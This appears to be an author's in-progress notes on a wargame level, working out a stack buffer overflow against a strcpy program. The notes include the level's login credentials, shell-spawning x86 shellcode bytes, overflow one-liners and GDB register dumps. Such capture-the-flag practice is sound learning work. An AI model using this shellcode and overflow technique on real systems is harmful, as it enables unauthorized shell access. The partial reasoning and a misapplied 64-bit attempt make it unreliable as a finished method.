@@ -1,0 +1,204 @@
+connection: ssh level5@io.netgarage.org
+password: DNLM3Vu0mZfX0pDd
+
+there is an introductiontoradare.sh -> run it and see
+it is what it says it is
+
+cat level05.c yields:
+===============================================================================
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv) {
+
+	char buf[128];
+
+	if(argc < 2) return 1;
+
+	strcpy(buf, argv[1]);
+
+	printf("%s\n", buf);	
+
+	return 0;
+}
+===============================================================================
+
+a character buffer is designated that can hold 127 chars + NULL
+
+if no argv[1] was provided, exit
+
+copy argv[1] into the buffer
+
+exit with a success code
+
+===
+
+so what happens if we provide 128 characters to the program:
+./level05 $(python -c "print 128*'\x61'")
+
+seems to do nothing, lets try way more:
+./level05 $(python -c "print 1000*'\x61'")
+-> Segmentation fault
+
+okay thats good, so we can probably overwrite the return address - but how do we get a shell from that?
+
+maybe we could use the same technique as before - and point to a modified command on PATH
+no, that won't work - as what we can work with is the return pointer only, so what we point to needs to exist on the stack or memory allocated
+
+i've heard of no-op sled, lets look up how to make one of those, and how to get it to land on a series of bytes that executes as code to give us shell.
+
+the NOP instruction on x86 is:
+-> 0x90
+
+but I guess I can't use:
+============================
+int main()
+{
+    system(\"/bin/sh\");
+    exit(0);
+}
+============================
+
+try compiling it and seeing what the ASM codes are in ghidra?:
+after a bunch of head-aches - the c code in level05.c was compiled -> level05
+
+in ghidra:
+the shellcode (the hex values) is as seen in shellcode_level05.png
+hopefully all we need is the hex values - although I suspect its a little more complicated that that given the external references
+
+f3 0f 1e fa
+55
+48 89 e5
+48 8d 05
+8c 0e 00 00
+48 89 c7
+e8 e0 fe
+ff ff
+bf 00 00
+00 00
+e8 e6 fe
+ff ff
+
+lets try assembling that:
+./level05 $(python -c "print '\xf3\x0f\x1e\xfa\x55\x48\x89\xe5\x48\x8d\x05\x8c\x0e\x00\x00\x48\x89\xc7\xe8\xe0\xfe\xff\xff\xbf\x00\x00\x00\x00\xe8\xe6\xfe\xff\xff'")
+-> ��UH��H��H������������� (the string that was copied into the buffer)
+
+so we get... something...
+not what we wanted though
+
+hmm - how many bytes do we require to actually get exactly to the return variable on the stack?
+so we don't need to guess or use a NOP sled
+
+can we look at the level05 executable without downloading it and inspecting in ghidra (that seems like a hassle)
+
+in level4 we wrote a custon whoami script that was called in the c function, can we do the same thing with the c libary printf function perhaps?
+
+few days later - looking around for ways to make shellcode, was reccomended pwntools, but having issues setting it up with spyder IDE
+
+did find the following shellcode that supposedly executes execve bin/sh:
+"\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\xbe\x2f\x2f\x73\x68\xc1\xee\x08\x56\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"
+
+lets try the above:
+./level05 $(python -c print"'\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\xbe\x2f\x2f\x73\x68\xc1\xee\x08\x56\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x31\xc0\xb0\x0b\xcd\x80'")
+
+this is our output:
+-> �1̀�É�1��F̀�//sh�Vh/bin��1�1�1��
+so there is clearly something being done - i can see /sh and /bin
+might be time to learn GDB so I can actually see where the stack is and where the return pointer is exactly...
+
+okay - disassembling main in GDB gives us:
+   0x0804841a <+102>:	ret  
+which means the return address is base + 102, or 0x0804841a
+
+info registers shows us:
+(gdb) info registers
+eax            0xb7fc3dbc          -1208205892
+ecx            0x6e0276a3          1845655203
+edx            0xbffffc84          -1073742716
+ebx            0x0                 0
+esp            0xbffffbb0          0xbffffbb0
+ebp            0xbffffc58          0xbffffc58
+esi            0x2                 2
+edi            0xb7fc2000          -1208213504
+eip            0x80483bd           0x80483bd <main+9>
+eflags         0x282               [ SF IF ]
+cs             0x73                115
+ss             0x7b                123
+ds             0x7b                123
+es             0x7b                123
+fs             0x0                 0
+gs             0x33                51
+
+given we can't see any r8 -> r15 registers, this looks like a x86 32bit system
+the stack pointer (ESP) is: -> 0xbffffbb0
+the base pointer (EBP) is: -> 0xbffffc58
+
+so i think what i need are three things:
+1 -> some shellcode that runs bin/sh
+2 -> the return address
+3 -> a pointer to the shellcode that overwrites the return address
+
+so the exploit would look like:
+
+[buffer characters]+[shellcode]+[pointer to the beginning of the shellcode]
+
+that would map onto:
+[intended buffer]+[unintended ]+[            return address               ]
+
+lets make a basic python program that would generate this:
+as seen in level5_exploit.py
+
+======
+
+been a week or so - lets try back again
+
+we are interested in trying to see what sits in the registers (specifically the return register) once the number we give the program has been put into memory. This is probably done with a call to a c-libary function? and there are two calls in the GDB dissasembly of main:
+
+0x080483ee <+58>:	call   0x80482d4 <strcpy@plt>
+
+0x08048404 <+80>:	call   0x80482b4 <printf@plt>
+
+so what are these functions?
+strcpy -> "The strcpy() function copies the string pointed by source (including the null character) to the destination. Returns the string"
+
+printf -> "Writes the C string pointed by the function argument to the standard output (stdout). Returns the total number of characters written as an int. If error returns a negative."
+
+so I think strcpy is the function where our overflow happens, if i set a breakpoint at 0x080483ee and inspect the registers:
+
+eax            0xbffffbd0          -1073742896
+ecx            0x5164e4fb          1365566715
+edx            0xbffffc84          -1073742716
+ebx            0x0                 0
+esp            0xbffffbb0          0xbffffbb0
+ebp            0xbffffc58          0xbffffc58
+esi            0x2                 2
+edi            0xb7fc2000          -1208213504
+eip            0x80483ee           0x80483ee <main+58>
+
+so the Stack starts at base:
+-> ebp 0xbffffc58
+and ends at:
+-> esp 0xbffffbb0
+
+so the stack is 168 addresses long (i think?)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
